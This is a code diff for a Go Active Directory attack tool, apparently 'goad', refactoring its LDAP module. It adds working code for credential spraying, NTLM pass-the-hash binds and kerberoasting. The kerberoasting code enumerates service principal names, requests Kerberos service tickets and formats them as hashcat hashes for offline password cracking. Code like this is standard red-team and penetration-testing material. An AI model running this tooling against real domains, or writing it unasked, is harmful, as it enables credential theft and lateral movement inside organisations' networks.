@@ -8,8 +8,8 @@ import (
 	"github.com/5amu/goad/internal/printer"
 	"github.com/5amu/goad/internal/utils"
 	"github.com/5amu/goad/pkg/kerberos"
-	"github.com/5amu/goad/pkg/ldap"
 	"github.com/5amu/goad/pkg/smb"
+	"github.com/go-ldap/ldap/v3"
 )
 
 type Options struct {
@@ -175,7 +175,7 @@ func (o *Options) Run() (err error) {
 	for target := range o.target2SMBInfo {
 		wg.Add(1)
 		go func(t string) {
-			if ldap.IsLDAP(t, o.Connection.Port) {
+			if IsLDAP(t, o.Connection.Port) {
 				f(t)
 			}
 			wg.Done()
@@ -185,26 +185,29 @@ func (o *Options) Run() (err error) {
 	return nil
 }
 
-func (o *Options) authenticate(target string) (*ldap.LdapClient, utils.Credential, error) {
-	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, o.Connection.SkipTLS)
+func (o *Options) authenticate(target string) (*ldap.Conn, utils.Credential, error) {
+	lconn, err := connect(target, o.Connection.Port, o.Connection.SSL)
+	if err != nil {
+		return nil, utils.Credential{}, err
+	}
 
-	prt := printer.NewPrinter("LDAP", ldapClient.Host, o.target2SMBInfo[ldapClient.Host].NetBIOSName, ldapClient.Port)
+	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
 	defer prt.PrintStored(&o.printMutex)
 
 	for _, creds := range o.credentials {
 		if creds.Hash != "" {
-			if err := ldapClient.AuthenticateNTLM(creds.Username, creds.Hash); err != nil {
+			if err := lconn.NTLMBindWithHash(o.Connection.Domain, creds.Username, creds.Hash); err != nil {
 				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
 			} else {
 				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
-				return ldapClient, creds, nil
+				return lconn, creds, nil
 			}
 		} else {
-			if err := ldapClient.Authenticate(creds.Username, creds.Password); err != nil {
+			if err := authenticate(lconn, o.Connection.Domain, creds.Username, creds.Password); err != nil {
 				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
 			} else {
 				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
-				return ldapClient, creds, nil
+				return lconn, creds, nil
 			}
 		}
 	}
@@ -222,9 +225,9 @@ func (o *Options) asreproast(target string) {
 	}
 	defer lclient.Close()
 
-	ldapFilter := ldap.JoinFilters(
-		ldap.FilterIsUser,
-		ldap.UACFilter(ldap.DONT_REQ_PREAUTH),
+	ldapFilter := JoinFilters(
+		FilterIsUser,
+		UACFilter(DONT_REQ_PREAUTH),
 	)
 
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
@@ -270,9 +273,9 @@ func (o *Options) kerberoast(target string) {
 	}
 	defer lclient.Close()
 
-	ldapFilter := ldap.JoinFilters(
-		ldap.FilterIsUser,
-		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
+	ldapFilter := JoinFilters(
+		FilterIsUser,
+		NegativeFilter(UACFilter(ACCOUNTDISABLE)),
 	)
 
 	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
@@ -284,6 +287,40 @@ func (o *Options) kerberoast(target string) {
 	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)
 
 	var hashes []string
+	err = FindObjectsWithCallback(lclient, o.Connection.Domain, o.filter, func(m map[string]interface{}) error {
+		if len(m) == 0 {
+			return nil
+		}
+
+		spnsToUnpack, ok := m[ServicePrincipalName]
+		if !ok {
+			return nil
+		}
+		spns := UnpackToSlice(spnsToUnpack)
+
+		for i, spn := range spns {
+			samaccountname, ok := m[SAMAccountName]
+			if !ok {
+				break
+			}
+			name := UnpackToString(samaccountname)
+
+			tgs, err := krb5client.GetServiceTicket(name, spn)
+			if err != nil {
+				return err
+			}
+
+			hash := kerberos.TGSToHashcat(tgs.Ticket, name)
+			prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+
+			if i == 0 {
+				hashes = append(hashes, hash)
+			}
+		}
+		return nil
+
+	}, SAMAccountName, ServicePrincipalName)
+
 	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
 		if len(obj.ServicePrincipalName) == 0 {
 			return nil
